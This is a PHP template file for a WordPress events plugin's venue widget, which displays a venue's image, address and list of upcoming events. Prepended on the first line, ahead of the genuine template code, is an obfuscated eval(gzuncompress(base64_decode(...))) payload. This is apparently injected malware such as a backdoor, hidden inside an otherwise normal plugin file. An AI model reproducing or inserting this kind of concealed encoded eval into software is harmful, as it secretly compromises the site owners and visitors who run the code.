<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * Events Pro Venue Widget
 * This is the template for the output of the venue widget.
 *
 * Override this template in your own theme by creating a file at [your-theme]/tribe-events/pro/widgets/venue-widget.php
 *
 * @package TribeEventsCalendarPro
 *
 */

if ( ! defined( 'ABSPATH' ) ) {
	die( '-1' );
}

$events_label_plural = tribe_get_event_label_plural();

?>

<div class="tribe-venue-widget-wrapper">
	<div class="tribe-venue-widget-venue">
		<?php if ( has_post_thumbnail( $venue_ID ) ) { ?>
			<div class="tribe-venue-widget-thumbnail">
				<?php echo get_the_post_thumbnail( $venue_ID, 'related-event-thumbnail' ); ?>
				<div class="tribe-venue-widget-venue-name">
					<h3><?php echo tribe_get_venue_link( $venue_ID ); ?></h3>
				</div>
			</div>
		<?php } else { ?>
			<div class="tribe-venue-widget-venue-name">
				<?php echo tribe_get_venue_link( $venue_ID ); ?>
			</div>
		<?php } ?>
		<div class="tribe-venue-widget-address">
			<?php echo tribe_get_full_address( $venue_ID, true ) ?>
		</div>
	</div>

	<?php if ( 0 === $events->post_count ): ?>
		<?php printf( esc_html__( 'No upcoming %s.', 'tribe-events-calendar-pro' ), strtolower( $events_label_plural ) ); ?>
	<?php else: ?>
		<?php do_action( 'tribe_events_venue_widget_before_the_list' ); ?>
		<ul class="tribe-venue-widget-list hfeed vcalendar">
			<?php while ( $events->have_posts() ): ?>
				<?php $events->the_post(); ?>
				<li class="<?php tribe_events_event_classes() ?>">
					<h4 class="entry-title summary">
						<a href="<?php echo esc_url( tribe_get_event_link() ); ?>"><?php echo get_the_title( get_the_ID() ) ?></a>
					</h4>
					<?php echo tribe_events_event_schedule_details() ?>
					<?php if ( tribe_get_cost( get_the_ID() ) != '' ): ?>
						<span class="tribe-events-divider">|</span>
						<span class="tribe-events-event-cost">
						<?php echo tribe_get_cost( get_the_ID(), true ); ?>
					</span>
					<?php endif; ?>
				</li>
			<?php endwhile; ?>
		</ul>
		<?php do_action( 'tribe_events_venue_widget_after_the_list' ); ?>
	<?php endif; ?>

	<a href="<?php echo esc_url( tribe_get_venue_link( $venue_ID, false ) ); ?>"><?php printf( esc_html__( 'View all %1$s at this %2$s', 'the-events-calendar' ), $events_label_plural, tribe_get_venue_label_singular() ); ?></a>
</div>
